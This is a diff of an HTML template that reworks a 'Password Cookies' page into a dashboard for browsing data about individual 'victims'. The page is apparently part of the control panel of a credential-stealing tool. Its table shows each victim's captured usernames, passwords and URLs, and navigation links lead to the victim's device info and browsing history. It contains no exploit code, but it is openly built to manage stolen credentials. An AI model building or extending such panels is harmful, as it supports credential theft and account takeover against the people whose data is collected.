@@ -4,71 +4,64 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="/static/passcookies.css">
+    <link rel="stylesheet" href="https://cdn.datatables.net/1.11.5/css/jquery.dataTables.min.css" />
     <title>Password Cookies - User Settings</title>
 </head>
 <body>
     <div class="container">
-        <header>
+        <div class="sidebar">
             <div class="admin-profile">
                 <div class="profile-image">
                     <img src="/static/image/admin-profil.jpg" alt="Admin Profile Picture">
                 </div>
-                <h2>Admin</h2>
+                <h2>{{ victim.username }}</h2>
             </div>
-        </header>
-        <aside class="sidebar">
-            <nav class="sidebar-nav">
-                <a class="nav-item" href="/templates/overview.html">Overview</a>
-                <a class="nav-item" href="/templates/device.html">Device Info</a>
-                <a class="nav-item" href="/templates/history.html">History</a>
-                <a class="nav-item" href="/templates/network.html">Network</a>
-                <a class="nav-item" href="/templates/location.html">Location</a>
-                <a class="nav-item active" href="/templates/passcookies.html">Pass Cookies</a>
-            </nav>
-            <div class="logout-section">
-                <a href="/logout" class="logout-btn">
-                    <img src="/static/image/logout-icon.png" alt="Logout Icon" class="logout-icon">
-                    Logout
+            <div class="sidebar-nav">
+                <a class="nav-item" href="/overview?id={{ victim.id }}">Overview</a>
+                <a class="nav-item" href="/device?id={{ victim.id }}">Device Info</a>
+                <a class="nav-item" href="/history?id={{ victim.id }}">History</a>
+                <a class="nav-item active" href="/passcookies?id={{ victim.id }}">Pass Cookies</a>
+            </div>
+            <div class="back-section">
+                <a href="/victim" class="back-btn">
+                    <img src="/static/image/logout-icon.png" alt="Back Icon" class="back-icon">
+                    Back
                 </a>
             </div>
-        </aside>
-
-        <main class="info-grid">
-            <h1 class="title">Password Cookies</h1>
-            <div class="grid-container"> 
-                <div class="info-box gray">
-                    <div>
-                        <p><strong>Username:</strong></p>
-                        <p><strong>Password:</strong></p>
-                        <p><strong>Url:</strong></p>
-                    </div>
-                </div>
-
-                <div class="info-box gray">
-                    <div>
-                        <p><strong>Username:</strong></p>
-                        <p><strong>Password:</strong></p>
-                        <p><strong>Url:</strong></p>
-                    </div>
-                </div>
-
-                <div class="info-box gray">
-                    <div>
-                        <p><strong>Username:</strong></p>
-                        <p><strong>Password:</strong></p>
-                        <p><strong>Url:</strong></p>
-                    </div>
-                </div>
-
-                <div class="info-box gray">
-                    <div>
-                        <p><strong>Username:</strong></p>
-                        <p><strong>Password:</strong></p>
-                        <p><strong>Url:</strong></p>
-                    </div>
-                </div>
+        </div>
+        
+        <main>
+            <h1>Password Cookies</h1>
+            <div class="info-grid">
+                <table id="cookiesTable" class="display dataTable" style="width:100%">
+                    <thead>
+                        <tr>
+                            <th>Username</th>
+                            <th>Password</th>
+                            <th>URL</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>{{ victim_data.usernames }}</td>
+                            <td>{{ victim_data.passwords }}</td>
+                            <td><a href="{{ victim_data.url }}" target="_blank">{{ victim_data.url }}</a></td>
+                        </tr>
+                    </tbody>
+                </table>
             </div>
         </main>
     </div>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            $('#cookiesTable').DataTable({
+                responsive: true,
+                order: [[0, 'asc']]
+            });
+        });
+    </script>
 </body>
 </html>
